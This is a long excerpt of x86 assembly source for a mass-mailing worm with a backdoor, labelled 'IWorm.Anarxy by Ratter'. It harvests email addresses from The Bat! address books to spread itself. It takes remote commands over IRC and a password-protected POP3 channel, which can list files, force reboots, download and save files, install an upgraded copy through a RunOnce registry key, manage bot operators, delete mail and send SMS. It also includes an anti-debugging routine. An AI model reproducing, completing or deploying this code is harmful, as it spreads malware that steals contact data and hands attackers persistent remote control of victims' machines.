enum_subkeys_loop:
    mov dword ptr [lpcsubkey], 750
    
    lea eax, [ftime]
    push eax
    push ecx
    push ecx
    push ecx
    @pushvar <lpcsubkey dd  ?>
    push edi
    push dword ptr [subkey_index]
    push dword ptr [key_handle__]
    call RegEnumKeyExA
    xchg eax, ecx
    jecxz enum_subkeys_all_ok
    
    cmp ecx, ERROR_NO_MORE_ITEMS
    jz enum_subkeys_end

enum_subkeys_all_ok:
    push ecx
    call try_this_subkey
    pop ecx
    jnc enum_subkeys_end

    inc dword ptr [subkey_index]
    
    jmp enum_subkeys_loop
    
enum_subkeys_end:
    add esp, 1000
    
    push dword ptr [key_handle__]
    call RegCloseKey
    
the_bat_spread_end:
    leave
    retn
the_bat_spread  endp

try_this_subkey:
    @pushsz "\Software\RIT\The Bat!"
    push edi
    call lstrcatA
    
    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <key_handle___ dd  ?>
    push eax
    push KEY_QUERY_VALUE
    push eax
    push eax
    push eax
    push edi
    push HKEY_USERS
    call RegCreateKeyExA

    xchg eax, ecx
    jecxz $+4
    stc
    retn

    sub esp, 500
    mov esi, esp
    mov dword ptr [lpcbdata], 400

    @pushvar <lpcbdata  dd  ?>
    push esi
    @pushvar <value_type    dd  ?>
    push 0
    @pushsz "Working Directory"
    push dword ptr [key_handle___]
    call RegQueryValueExA
    test eax, eax
    stc
    jnz try_this_subkey_end

    push edi
    call try_this_directory
    pop edi
    
try_this_subkey_end:
    lahf
    add esp, 500

    push eax
    push dword ptr [key_handle___]
    call RegCloseKey
    pop eax
    
    sahf
    retn

; in: esi -  working directory
try_this_directory:
    push ebp

    pushad
    @copysz
    popad
    
    sub esp, 300
    mov ebx, esp
    
    sub esp, 300
    mov ebp, esp
    
    @pushsz "addrbook.ini"
    push edi
    call lstrcatA
    
    push edi
    push 300
    push ebx
    @pushsz "-"
    @pushsz "Address Books"
    @pushsz "Profile"
    call GetPrivateProfileStringA
    
    cmp byte ptr [ebx], "-"
    jz try_this_directory_end
    
    push esi
    mov esi, ebx
    call ascii_to_num
    pop esi

    xchg eax, ecx
    test ecx, ecx
    jz try_this_directory_end
    
    push 1
    pop eax

address_book_loop:
    pushad
    mov edi, ebp
    @copy esi
    stosb
    popad

    push ecx
    push eax

    push edi
    push ebx
    push esi
    mov edi, offset address_book_
    xor edx, edx
    push 10
    pop ecx
    call convert_num
    add edi, ebx
    xor eax, eax
    stosb
    pop esi
    pop ebx
    pop edi
    
    push edi
    push 300
    push ebx
    @pushsz "-"
    push offset address_book
    @pushsz "Profile"
    call GetPrivateProfileStringA
    
    pop eax
    pop ecx
    
    cmp byte ptr [ebx], "-"
    jz try_this_directory_end

    push ecx
    push eax

    push ebx
    push edi
    mov edi, ebx
    mov eax, ebx
    mov ecx, ebx
    call file_name_only
    mov ebx, eax
    pop edi

    cmp ecx, eax
    jz address_book_next
    mov ebx, ecx
    and byte ptr [ebp], 0
    
address_book_next:
    push ebx
    push ebp
    call lstrcatA

    call try_this_file
    pop ebx
    pop eax
    pop ecx

    inc eax
    dec ecx
    jnz address_book_loop

    clc
    jmp try_this_directory_end+1
try_this_directory_end:
    stc
    lahf
    add esp, 600
    sahf
    pop ebp
    retn

; in: ebp - address book file   
try_this_file:
    pushad

    xor eax, eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_READ or GENERIC_WRITE
    push ebp
    call CreateFileA
    inc eax
    jz try_this_file_end
    mov dword ptr [addr_book_file], eax
    
    push 0
    push eax
    call GetFileSize
    mov dword ptr [file_size_], eax
    
    xor ecx, ecx
    push ecx
    push eax
    push ecx
    push PAGE_READWRITE
    push ecx
    push dword ptr [addr_book_file]
    call CreateFileMappingA
    xchg eax, ecx
    test ecx, ecx
    jz try_this_file_end_close_file
    mov dword ptr [hmap], ecx
    
    xor eax, eax
    push eax
    push eax
    push eax
    push FILE_MAP_READ or FILE_MAP_WRITE
    push ecx
    call MapViewOfFile
    xchg eax, ecx
    jecxz try_this_file_end_close_mapping
    xchg ecx, edi

    mov ecx, 12345678h
file_size_  equ $-4

    mov dword ptr [mapping_base], edi

    mov eax, 0ffa60a0dh
    
try_this_file_main_loop:
    repnz scasb
    jecxz try_this_file_end_unmap
    
    cmp dword ptr [edi-1], eax
    jnz try_this_file_main_loop

    push edi

    dec edi
    push edi
    
    mov dword ptr [esp], edi
email_address_loop:
    dec edi
    cmp byte ptr [edi], 20h
    jae try_it_next
    jmp email_address_loop_end
try_it_next:
    cmp byte ptr [edi], 7fh
    jc email_address_loop
    
email_address_loop_end:
    cmp word ptr [edi-1], CR_LF
    jnz email_address_loop_got_it
    dec edi
    jmp email_address_loop-3
    
email_address_loop_got_it:
    inc edi
    lea esi, [msiefix_email]
    mov dword ptr [esi.EM_RcptTo], edi
    
    pop edi
    
    push dword ptr [edi]
    and byte ptr [edi], 0

    pushad
    call spread_msiefix
    popad
    
    pop dword ptr [edi]
    pop edi
    jmp try_this_file_main_loop

try_this_file_end_unmap:
    push 12345678h
mapping_base    equ $-4
    call UnmapViewOfFile
try_this_file_end_close_mapping:
    push 12345678h
hmap    equ $-4
    call CloseHandle    
try_this_file_end_close_file:
    push 12345678h
addr_book_file  equ $-4
    call CloseHandle
try_this_file_end:
    popad
    retn
    
ls_command  proc
    local   wfd:WIN32_FIND_DATA

    xor eax, eax
    call is_user_allowed
    jc ls_command_end

    call message_for_who
    mov dword ptr [recipient], eax

    cmp dword ptr [to_flag], 0
    jnz ls_command_end

    call go_over_gapz
    jc ls_command_end

    lea eax, [wfd]
    push eax
    push edi
    call FindFirstFileA
    inc eax
    jz ls_command_end
    dec eax

    xchg eax, ebx
    
    mov eax, 30000
    call heap_alloc
    xchg eax, edi

    mov dword ptr [privmsg_what], edi

ls_command_loop:
    lea esi, [wfd.WFD_szFileName]
    mov al, '\'
    
    test dword ptr [wfd.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
    jz $+3
    stosb
    
    @copysz
        inc edi

    mov dword ptr [edi-2], ' ;'

    lea eax, [wfd]
    push eax
    push ebx
    call FindNextFileA
    xchg eax, ecx
    jecxz ls_command_close
    
    jmp ls_command_loop

ls_command_close:
    push ebx
        call FindClose

    mov edi, dword ptr [privmsg_what]

    mov esi, 400
    call split_string
    mov ecx, edx

    push edi

ls_command_print_loop:
        mov dword ptr [privmsg_what], edi

    pushad
        lea esi, [privmsg_msg]
    call send_message
    popad

    @endsz_

    loop ls_command_print_loop

    call heap_free

    clc
    jmp ls_command_end+1
ls_command_end:
    stc
    leave
    retn
ls_command  endp

reboot_command:
    push 1
    pop eax
    call is_user_allowed
    jc reboot_command_end

reboot_command_:
    push 0
    push EWX_REBOOT or EWX_FORCE
    call ExitWindowsEx

    push 0
    push EWX_FORCE
    call ExitWindowsEx

    jmp exit_program
reboot_command_end:
    retn


Create_Thread:
    @pushvar <dd    ?>
    push 0
    push 0
    push eax
    push 8192
    push 0
    call CreateThread
    retn

heap_alloc:
    push eax
    push HEAP_ZERO_MEMORY
    push dword ptr [heap_handle]
    call HeapAlloc
    retn

heap_free:
    pop edi
    push 0
    push dword ptr [heap_handle]
    call HeapFree
    jmp edi
    
; in: esi - sms message
;     ebx - _email_ struc
sms_send    proc
    local   sms_parts:DWORD
    local   sms_mail:DWORD

    mov dword ptr [sms_mail], ebx

    mov eax, 1000
    call heap_alloc
    xchg eax, edi
    
    mov eax, 200
    call heap_alloc
    xchg eax, ebx

    push edi
    @copysz
    pop edi

    mov esi, dword ptr [sms_max]
    call split_string
    mov dword ptr [sms_parts], edx
    mov ecx, edx
    
    xor edx, edx
    mov esi, edi
    inc edx
    
sms_send_loop:
    push edi
    mov edi, ebx
    
    mov al, '['
    stosb
    
    mov eax, edx
    call _convert_num_

    mov al, '/'
    stosb
    
    mov eax, dword ptr [sms_parts]
    call _convert_num_
    
    mov al, ']'
    stosb
    
    mov al, 20h
    stosb
    
    @copysz
    
    pop edi
    
    pushad
    mov esi, dword ptr [sms_mail]
    mov dword ptr [esi.EM_Message], ebx
    call send_mail
    popad
    jc sms_send_end

    inc edx
    
    pushad
    mov eax, 500
    call online_sleep
    popad
    jc sms_send_end
    
    loop sms_send_loop

    clc
sms_send_end:
    pushfd
    push edi
    call heap_free
    push ebx
    call heap_free
    popfd
    leave
    retn
sms_send    endp

split_string:
    pushad
    mov ebx, edi
    mov ebp, edi
    xor eax, eax
    cdq
    mov ecx, eax

split_string_loop:
    .if byte ptr [edi] == 20h
        mov ebx, edi
    .endif
    
    cmp byte ptr [edi], 0
    jz split_string_end
    
    inc ecx
    inc edi
    
    cmp ecx, esi
    jc split_string_loop

    mov ecx, eax

    .if ebx == ebp
        mov ebx, edi
    .endif

    mov edi, ebx
    and byte ptr [edi], 0
    inc edi
    inc ebx
    inc edx
    mov ebp, ebx
    jmp split_string_loop
    
split_string_end:
    inc edx
    mov dword ptr [esp.Pushad_edx], edx
    popad
    retn
    
_convert_num_:
    pushad
    xor edx, edx
    push 10
    pop ecx
    call convert_num
    add edi, ebx
    mov dword ptr [esp.Pushad_edi], edi
    popad
    retn

setup_sms:
    xor eax, eax
    call is_user_allowed
    jc setup_sms_end
    
    call go_over_gapz
    jc setup_sms_end
    
    mov esi, edi
    call ascii_to_num

    mov dword ptr [sms_max], eax

    clc
setup_sms_end:
    retn
    
upgrade_command:
    sub esp, 300
    mov esi, esp
    
    push 300
    push esi
    @pushsz "%windir%\system\msiefixupgrade.exe"
    call ExpandEnvironmentStringsA
    
    push 1
    pop eax
    push esi
    call is_user_allowed
    pop esi
    jc upgrade_command_end_error
    
    call go_over_gapz
    jc upgrade_command_end_error

    call internet_read_file
    test ecx, ecx
    jz upgrade_command_end_error

    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <_key_handle   dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_SET_VALUE
    push eax
    push eax
    push eax
    @pushsz "Software\Microsoft\Windows\CurrentVersion\RunOnce"
    push HKEY_LOCAL_MACHINE
    call RegCreateKeyExA
    test eax, eax
    jnz upgrade_command_end_error

    push esi
    call lstrlen
    
    push eax
    push esi
    push REG_SZ
    push 0
    @pushsz "MSIEFixUpgrade"
    mov ebx, dword ptr [_key_handle]
    push ebx
    call RegSetValueExA

    push ebx
    call RegCloseKey

    call leave_command

    clc
    jmp upgrade_command_end_error+1
upgrade_command_end_error:
    stc
    lahf
    add esp, 300
    sahf
    retn
    
dl_file_command:
    push 1
    pop eax
    call is_user_allowed
    jc dl_file_command_end
    
    call go_over_gapz
    jc dl_file_command_end

    push edi
    call file_name_only
    pop edi
    xchg eax, esi

    sub esp, 8
    mov ebx, esp
    
    mov dword ptr [ebx], esi
    mov dword ptr [ebx+4], edi
    
    @pushvar <dd    ?>
    push 0
    push ebx
    push offset dl_file_thread
    push 8192
    push 0
    call CreateThread

    mov ebx, eax
    test eax, eax
    jnz dl_file_command_allz_ok
    
    add esp, 8
    jmp dl_file_command_end_error
    
dl_file_command_allz_ok:
    push 10000
    push ebx
    call WaitForSingleObject
    inc eax
    jz dl_file_command_end_
    cmp eax, WAIT_TIMEOUT
    jz dl_file_command_end_

    sub esp, 4
    push esp
    push ebx
    call GetExitCodeThread
    mov eax, dword ptr [esp]
    add esp, 4

dl_file_command_end_:
    push eax
    push ebx
    call CloseHandle
    pop eax

    add esp, 8
    
    test eax, eax
    jz dl_file_command_end_error
    
    clc
    jmp dl_file_command_end_error+1
dl_file_command_end_error:
    stc
dl_file_command_end:
    retn

dl_file_thread  proc    argz:DWORD
    mov eax, dword ptr [argz]
    
    mov esi, dword ptr [ebx]
    mov edi, dword ptr [ebx+4]
    
    call internet_read_file
    
    leave
    push ecx
    call ExitThread
dl_file_thread  endp

; in: edi - internet resource address (FTP or HTTP)
;     esi - file_name to store to
internet_read_file  proc
    local   internet_handle:DWORD
    local   internet_resource:DWORD
    local   bytes_avail:DWORD
    local   file_handle:DWORD
    local   bytes_read_:DWORD
    
    pushad

    xor eax, eax
    push eax
    push eax
    push CREATE_ALWAYS
    push eax
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push esi
    call CreateFileA
    inc eax
    xchg eax, ecx
    test ecx, ecx
    jz internet_read_file_end_error_
    dec ecx
    
    mov dword ptr [file_handle], ecx

    xor eax, eax
    push eax
    push eax
    push eax
    push INTERNET_OPEN_TYPE_DIRECT
    @pushsz "IWorm.Anarxy by Ratter"
    call InternetOpenA
    xchg eax, ecx
    test ecx, ecx
    jz internet_read_file_end_error_
    
    mov dword ptr [internet_handle], ecx
    
    xor eax, eax
    push eax
    push eax
    push eax
    push eax
    push edi
    push dword ptr [internet_handle]
    call InternetOpenUrlA
    xchg eax, ecx
    jecxz internet_read_file_end_close
    mov dword ptr [internet_resource], ecx

    mov eax, 64000
    call heap_alloc
    xchg eax, ebx


internet_read_file_loop:
    lea edx, [bytes_avail]
    xor eax, eax
    push eax
    push eax
    push edx
    push dword ptr [internet_resource]
    call InternetQueryDataAvailable
    xchg eax, ecx
    jecxz internet_read_file_end_close_
    
    mov edx, dword ptr [bytes_avail]

    cmp edx, 64000
    jbe internet_read_file_
    
    mov edx, 64000

internet_read_file_:
    lea eax, [bytes_read_]
    push eax
    push edx
    push ebx
    push dword ptr [internet_resource]
    call InternetReadFile
    xchg eax, ecx
    jecxz internet_read_file_end_close_
    
    mov ecx, dword ptr [bytes_read_]
    jecxz internet_read_file_done
    
    push 0
    @pushvar <dd    ?>
    push ecx
    push ebx
    push dword ptr [file_handle]
    call WriteFile
    xchg eax, ecx
    jecxz internet_read_file_end_close_

    jmp internet_read_file_loop

internet_read_file_done:
    push 1
    pop ecx
internet_read_file_end_close_:
    push ecx
    push ebx
    call heap_free
    push dword ptr [internet_resource]
    call InternetCloseHandle
    pop ecx
internet_read_file_end_close:
    push ecx
    push dword ptr [internet_handle]
    call InternetCloseHandle
    pop ecx
internet_read_file_end_error:
    push ecx
    push dword ptr [file_handle]
    call CloseHandle
    pop ecx
internet_read_file_end_error_:
    mov dword ptr [esp.Pushad_ecx], ecx
    popad
    leave
    retn
internet_read_file  endp

add_oper_command:
    push 1
    pop eax
    call is_user_allowed
    jc add_oper_command_end
    
    call go_over_gapz
    jc add_oper_command_end
    
    push dword ptr [msg_from]
    mov dword ptr [msg_from], edi

    xor eax, eax    
    call go_until_gap
    jc add_oper_command_go_on
    
    stosb
    
    call go_over_gapz
    jc add_oper_command_go_on
    
    mov esi, edi
    call ascii_to_num
    
add_oper_command_go_on:
    push eax
    push 1
    pop eax
    call is_user_allowed
    pop eax
    jnc add_oper_command_end_
    call add_oper
add_oper_command_end_:
    pop dword ptr [msg_from]
    jmp add_oper_command_end+1
add_oper_command_end:
    stc
    retn
    
remove_oper_command:
    push 1
    pop eax
    call is_user_allowed
    jc remove_oper_command_end
    
    call go_over_gapz
    jc remove_oper_command_end
    
    push dword ptr [msg_from]
    mov dword ptr [msg_from], edi
    call remove_oper
    pop dword ptr [msg_from]
remove_oper_command_end:
    retn
    
list_operz_command:
    xor eax, eax
    call is_user_allowed
    jc list_operz_command_end

    call message_for_who
    mov dword ptr [recipient], eax
    
    lea esi, dword ptr [operz]
    lodsd
    xchg eax, ecx
    jecxz list_operz_command_end
    
list_operz_loop:
    lodsd
    test eax, eax
    jz list_operz_loop_

    inc eax
    jz list_operz_command_ok
    dec eax

    mov dword ptr [privmsg_what], eax
    
    pushad
    lea esi, [privmsg_msg]
    call send_message
    popad

    mov eax, 200
    call online_sleep
    jc list_operz_command_end

list_operz_loop_:
    inc esi
    
    dec ecx
    jnz list_operz_loop
    
list_operz_command_ok:
    clc
    jmp list_operz_command_end+1
list_operz_command_end:
    stc
    retn

msg_box_command:
        push 1
    pop eax
    call is_user_allowed
    jc remove_oper_command_end

    call go_over_gapz
        mov esi, edi

        call ascii_to_num
        xchg eax, edx
    mov edi, esi

        call parse_string_
    jc msg_box_command_end
    mov esi, eax

    call parse_string_
    jc msg_box_command_end
    mov ebx, eax

    push 0
    push esi
    push ebx
    push edx
    call MessageBoxA

msg_box_command_end:
    retn
    
anti_debug  proc
    local   _context_:CONTEXT
    
    call GetCurrentThread

    lea esi, [_context_]
    push eax
        mov dword ptr [esi.CONTEXT_ContextFlags], CONTEXT_FULL or \
                              CONTEXT_DEBUG_REGISTERS
    push esi
    push eax
        call GetThreadContext
        
        or dword ptr [esi.CONTEXT_Dr7], 10000000000000b
        
        pop eax
    mov dword ptr [esi.CONTEXT_ContextFlags], CONTEXT_DEBUG_REGISTERS
    push esi
    push eax
    call SetThreadContext
    leave
    retn
anti_debug  endp

pop3_gateway    proc
    local   pop3_sin_:sockaddr_in
    local   pop3_counter:DWORD
    local   pop3_messagez:DWORD
    local   pop3_message_size:DWORD
    local   pop3_temp:DWORD
    local   pop3_buffer:DWORD
    local   pop3_message_text:DWORD
    local   pop3_email_flagz:DWORD
    local   pop3_email:_email_
        local   pop3_return_path:_temp_buffer_
    local   pop3_boundary:_temp_buffer_

    @SEH_SetupFrame <jmp pop3_gateway_exit>

        mov dword ptr [is_user_allowed], offset pop3_user_allowed
    mov dword ptr [send_message], offset pop3_send_message
    mov dword ptr [message_for_who], offset pop3_message_for_who
    mov dword ptr [smtp_timeout], INFINITE

        call get_local_host
    
        push 100
        pop eax
        call heap_alloc
        xchg eax, edi
        mov dword ptr [pop3_buffer], edi

pop3_gateway_main_loop:
        push -5
    pop dword ptr [pop3_counter]

pop3_gateway_main_loop_:
    cmp dword ptr [online_flag], 1
    jnz pop3_gateway_end_counter

    push 1000
    push dword ptr [pop3_buffer]
    push HEAP_ZERO_MEMORY
    push dword ptr [heap_handle]
    call HeapReAlloc
    xchg eax, edi
    mov dword ptr [pop3_buffer], edi

        push 0
        push SOCK_STREAM
    push AF_INET
    call socket
    inc eax
    jz pop3_gateway_exit
            
    dec eax
    mov dword ptr [pop3_handle], eax
    
    mov esi, offset pop3_server
    call get_hostent
    jz pop3_gateway_end_counter

    push edi
        lea edi, [pop3_sin_]
    push POP3_PORT
    pop ebx
    call update_sin
    pop edi

    lea eax, [pop3_sin_]
    push type(sockaddr_in)
    push eax
    push dword ptr [pop3_handle]
    call connect

    test eax, eax
    jnz pop3_gateway_end_counter

    call pop3_get_response
    cmp eax, OK
    jnz pop3_gateway_end_counter
    
    ; nowa in AUTHORIZATION state

    lea esi, [pop3_user]
    call pop3_send_command
    jnz pop3_gateway_end_counter
    
    lea esi, [pop3_password]
    call pop3_send_command
        jnz pop3_gateway_end_counter

    ; nowa in TRANSACTION state 

    ;C:    STAT
        ;S:    +OK 2 320
    lea esi, pop3_stat
    call pop3_send_command
    jnz pop3_emailz_end

    add edi, 4

    call go_over_gapz
        mov esi, edi
    call ascii_to_num
    cmp eax, 9999
    ja pop3_delete_whole_email_box

    test eax, eax
    jz pop3_emailz_end

    mov dword ptr [pop3_messagez], eax

pop3_emailz_main_loop:
    mov eax, dword ptr [pop3_messagez]
    push dword ptr [pop3_buffer]
        lea edi, [email_message_buffer]
    call _convert_num_
        xor eax, eax
    stosb
        pop edi

        ;C:    LIST 2
        ;S:    +OK 2 200
        lea esi, [pop3_list]
        call pop3_send_command
        jnz pop3_emailz_end

        add edi, 4

        call go_over_gapz
    call go_until_gap
    call go_over_gapz

        mov esi, edi
    call ascii_to_num

    mov dword ptr [pop3_message_size], eax
    mov dword ptr [find_string_ecx], eax

    add eax, 100

        push eax
    push dword ptr [pop3_buffer]
    push HEAP_ZERO_MEMORY
    push dword ptr [heap_handle]
    call HeapReAlloc
    test eax, eax
    jnz pop3_heap_realloc_valid

    mov edi, dword ptr [pop3_buffer]
    jmp pop3_delete_message

pop3_heap_realloc_valid:
        xchg eax, edi
        mov dword ptr [pop3_buffer], edi

        ;TOP <message> 1
        lea esi, [pop3_top]
        call pop3_send_command
        jnz pop3_delete_message

        push 0
    push 10000          ; recieve header + 1st line
    push edi
    push dword ptr [pop3_handle]
    call recv

        call lookup_email_header
        jc pop3_delete_message

        call pop3_check_password    ; is first word password?
        jc pop3_delete_message

        lea esi, [pop3_retr]
        call pop3_send_command
    jnz pop3_delete_message

    ; ok now ready to retrieve the whole email_message

    call pop3_retrieve_message
    jc pop3_delete_message

    ; ...

    call pop3_do_message

IFDEF   del_emailz
    cmp eax, ERROR
    jz pop3_delete_message

    test dword ptr [pop3_email_flagz], DELETE_FORBIDDEN ; can we delete the msg?
    jnz pop3_next_message_in_box

pop3_delete_message:
    lea esi, [pop3_dele]
    call pop3_send_command
    jnz pop3_emailz_end

ENDIF
IFNDEF  del_emailz
pop3_delete_message:
ENDIF

pop3_next_message_in_box:
    dec dword ptr [pop3_messagez]
    jnz pop3_emailz_main_loop
    

pop3_emailz_end:
    lea esi, [quit]
    call write_socket
    ; nowa in UPDATE state

    push dword ptr [pop3_handle]
    call closesocket

    mov eax, 3*60000
    call online_sleep
    jc pop3_gateway_exit

    jmp pop3_gateway_main_loop

pop3_gateway_end_counter:
    push dword ptr [pop3_handle]
    call closesocket

    cmp dword ptr [online_flag], 1
    jnz pop3_gateway_exit

    inc dword ptr [pop3_counter]
    jz pop3_gateway_run_ircbot

    mov eax, 1*60000
        call online_sleep
    jc pop3_gateway_exit
     
        jmp pop3_gateway_main_loop_

pop3_gateway_run_ircbot:
    call ircbot_run_command
 
pop3_gateway_exit:
    push dword ptr [pop3_buffer]
    call heap_free
    @SEH_RemoveFrame
    leave
    push 0
    call ExitThread

pop3_delete_whole_email_box:
    xchg eax, ecx
    push 1
    pop eax
    call delete_messagez 
    jmp pop3_emailz_end

pop3_gateway    endp

ircbot_run_command:
    cmp dword ptr [online_flag], 1
    stc
    jnz ircbot_run_command_end+1

        mov dword ptr [is_user_allowed], offset _is_user_allowed_
    mov dword ptr [send_message], offset _send_message_
    mov dword ptr [message_for_who], offset _message_for_who_
    mov dword ptr [smtp_timeout], 60000

        mov eax, offset ircbot_thread
    call Create_Thread
    xchg dword ptr [inet_threadz], eax

    push eax

        push INFINITE
    push dword ptr [inet_threadz]
    call WaitForSingleObject

    pop eax

    xchg dword ptr [inet_threadz], eax

    push eax
    call CloseHandle

    mov dword ptr [is_user_allowed], offset pop3_user_allowed
    mov dword ptr [send_message], offset pop3_send_message
    mov dword ptr [message_for_who], offset pop3_message_for_who
    mov dword ptr [smtp_timeout], INFINITE

ircbot_run_command_end:
        clc
    retn

del_emailz_command:
        call go_over_gapz
        mov esi, edi
        call ascii_to_num
        mov edi, esi

        push eax
        call go_over_gapz
        mov esi, edi
        call ascii_to_num
        xchg ecx, eax

        pop eax
    call delete_messagez
    retn

save_email_filez_command:
    pushad

    call go_over_gapz
    mov esi, edi
    call ascii_to_num
    mov dword ptr [save_email_filez_looping], eax

        mov eax, dword ptr [pop3_message_size]
        call heap_alloc
    xchg eax, esi

        mov edi, dword ptr [pop3_message_text]

save_email_filez_command_loop:
    dec dword ptr [save_email_filez_looping]

        push esi
        lea esi, [pop3_boundary]
    call find_string
    mov edi, ebx

    lea esi, [pop3_name]
    call find_string
    mov edi, ebx
    call go_until_gap
    and byte ptr [edi-1], 0

    call pop3_find_2x_CR_LF
    call go_over_all_gapz
    pop esi

    xchg esi, edi
    call base64_decode
    xchg esi, edi

    push eax

    xor eax, eax
    push eax
    push eax
    push CREATE_ALWAYS
    push eax
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push ebx
    call CreateFileA
    pop edx
    inc eax
    jz save_email_filez_command_error
    dec eax
    xchg eax, ebx

    push 0
    @pushvar <dd    ?>
    push edx
    push esi
    push ebx
    call WriteFile

    push ebx
    call CloseHandle

    mov ecx, 12345678h
save_email_filez_looping    equ $-4
    clc
    jecxz save_email_filez_command_error+1

    jmp save_email_filez_command_loop

save_email_filez_command_error:
    stc
    pushfd
        push esi
    call heap_free
    popfd
    popad
    retn

pop3_user_allowed:
    clc
    retn

pop3_message_for_who:
    and dword ptr [to_flag], 0
    retn

pop3_send_message:
        push esi
    push edi

    mov esi, dword ptr [privmsg_what]

        mov edi, 12345678h
pop3_send_message_buffer    equ $-4

    @copysz
    mov dword ptr [edi-1], ' ;'
    inc edi

    mov dword ptr [pop3_send_message_buffer], edi

    pop edi
    pop esi 
        retn

; out: eax - "-ER" or not "-ER" :)
pop3_do_message:
        pushad
    mov eax, 3000
    call heap_alloc
    mov dword ptr [pop3_temp], eax
    mov dword ptr [pop3_send_message_buffer], eax

    xchg eax, ebx

        xor eax, eax
    lea edi, [pop3_email]
    lea ecx, [pop3_return_path]
    mov dword ptr [edi.EM_MailFrom], offset pop3_email_addr
    mov dword ptr [edi.EM_RcptTo], ecx
    mov dword ptr [edi.EM_Subject], eax
    mov dword ptr [edi.EM_FilezNum], eax

        call pop3_do_message_
        jnc pop3_do_message_all_iz_ok
        mov dword ptr [ebx], "RE-"

pop3_do_message_all_iz_ok:
        mov dword ptr [edi.EM_Message], ebx

    mov eax, dword ptr [ebx]
    mov dword ptr [esp.Pushad_eax], eax

        test dword ptr [pop3_email_flagz], 1
    jnz pop3_do_message_send_sms

        mov esi, edi
        call send_mail
    jmp pop3_do_message_end

pop3_do_message_send_sms:
        xchg esi, ebx
        mov ebx, edi
    call sms_send

pop3_do_message_end:
        push dword ptr [pop3_temp]
        call heap_free
        popad
    retn

; out: Cflag - false|true
pop3_do_message_:
    pushad

    mov eax, 500
    call heap_alloc
    xchg ebx, eax

        mov edi, dword ptr [pop3_message_text]
        call go_until_gap           ; first is password
        call go_over_all_gapz

        mov esi, edi
        call ascii_to_num           ; second are flagz
        mov dword ptr [pop3_email_flagz], eax
    mov edi, esi

pop3_do_message_main_loop:
    call go_over_all_gapz

    mov esi, edi
    mov edi, ebx

pop3_do_message_command_loop:
    lodsb
    cmp al, ';'
    jz pop3_do_message_got_command
    cmp al, 20h
    jc pop3_do_message_command_loop
    stosb
    jmp pop3_do_message_command_loop
pop3_do_message_got_command:
    xor eax, eax
    stosb

    mov edi, esi
        
        cmp dword ptr [ebx], "dne!"
        jz pop3_do_message_allz_ok

        mov dword ptr [msg_paramz], ebx

        push edi
        mov edi, dword ptr [pop3_send_message_buffer]
        inc dword ptr [pop3_send_message_buffer]
        mov word ptr [edi], '['
        pop edi

        pushad
        call privmsg_fc
        popad

        push edi
        mov edi, dword ptr [pop3_send_message_buffer]
        inc dword ptr [pop3_send_message_buffer]
        mov word ptr [edi], ']'
        pop edi

        jmp pop3_do_message_main_loop

pop3_do_message_allz_ok:
    clc
    jmp pop3_do_message_end_error+1
pop3_do_message_end_error:
    stc
    pushfd
    push ebx
    call heap_free
    popfd
    popad
    retn

; in: edi - email
; out: edi - email_text
go_over_email_header:
    pushad

    call pop3_find_2x_CR_LF

    cmp dword ptr [pop3_boundary], 0
    jz go_over_email_header_end

    lea esi, [pop3_boundary]
    call find_string
    xchg ebx, edi

    call pop3_find_2x_CR_LF
go_over_email_header_end:
    call go_over_all_gapz
        mov dword ptr [esp.Pushad_edi], edi
        mov dword ptr [pop3_message_text], edi
    popad
    retn

; in: edi - message header (end - 2xCR_LF)
lookup_email_header:
    pushad

    lea esi, [return_path]
    call find_string
    jc lookup_email_header_end

        push edi
        xchg edi, ebx

    call go_over_gapz

    cmp byte ptr [edi], "<"
    jnz $+3
    inc edi

    mov ebx, edi

    call go_until_gap

    cmp byte ptr [edi-1], ">"
    jnz $+3
    dec edi

    and byte ptr [edi], 0
    
    lea eax, [pop3_return_path]
        push ebx
        push eax
        call lstrcpy
    
    pop edi

    and dword ptr [pop3_boundary], 0

    lea esi, [boundary]
    call find_string
    jc lookup_email_header_end_

    mov edi, ebx
    call go_until_gap
    and byte ptr [edi-1], 0

        lea eax, [pop3_boundary]
        push ebx
        push eax
        call lstrcpy
    
lookup_email_header_end_:
    clc
lookup_email_header_end:
    popad
    retn

; in: esi - string to search
;     edi - where to search
; out: Cflag - true|false
;      ebx - the first byte after founded string
find_string:
    pushad
    
    push esi
    mov ebx, esi
    @endsz
    dec esi
    sub esi, ebx
    xchg esi, edx
    pop esi

    lodsb
    dec edx
    jz find_string_end_error

    mov ecx, 12345678h
find_string_ecx equ $-4

find_string_main_loop:
    jecxz find_string_end_error

    repnz scasb
    jnz find_string_main_loop

    push edi
    push esi
    push ecx
    mov ecx, edx
    repz cmpsb
    pop ecx
    pop esi
    pop ebx
    jz find_string_found

    xchg ebx, edi
    jmp find_string_main_loop

find_string_found:
    clc
    mov dword ptr [esp.Pushad_ebx], edi
    jmp find_string_end_error+1
find_string_end_error:
    stc
    popad
    retn

pop3_retrieve_message:
        push edi
        mov ebx, dword ptr [pop3_message_size]

pop3_retrieve_message_loop:
    cmp dword ptr [online_flag], 1
    jnz pop3_retrieve_message_end_error

    push 0
    push 2000
    push edi
    push dword ptr [pop3_handle]
    call recv
    inc eax
    jz pop3_retrieve_message_end_error
    dec eax
    xchg eax, ecx
    jecxz pop3_retrieve_message_end

    add edi, ecx

    sub ebx, ecx
    jnc pop3_retrieve_message_loop

pop3_retrieve_message_end:
    clc
    jmp pop3_retrieve_message_end_error+1
pop3_retrieve_message_end_error:
    stc
    pop edi
    retn

pop3_check_password:
        push edi

    call go_over_email_header

    cmp byte ptr [edi], '!'
    jnz pop3_check_password_end_error

    inc edi
    mov esi, edi
    call go_until_gap
    mov eax, esi

    sub edi, eax

        push edi
    call gimme_CRC32

    cmp eax, dword ptr [bot_password]
        jnz pop3_check_password_end_error

        clc
        jmp pop3_check_password_end_error+1
pop3_check_password_end_error:
    stc
    pop edi
    retn

pop3_find_2x_CR_LF:
        mov al, 0ah
        mov ecx, 12345678h
pop3_CR_LF_loop:
        repnz scasb
        jnz pop3_check_password_end_error

        cmp word ptr [edi], CR_LF
        jnz pop3_CR_LF_loop
        retn

; in: esi - command_string possibly with replacementz
pop3_send_command:
    push edi

    push 1000
    pop eax
    call heap_alloc
    mov dword ptr [temp_buffer], eax

    mov eax, 10000
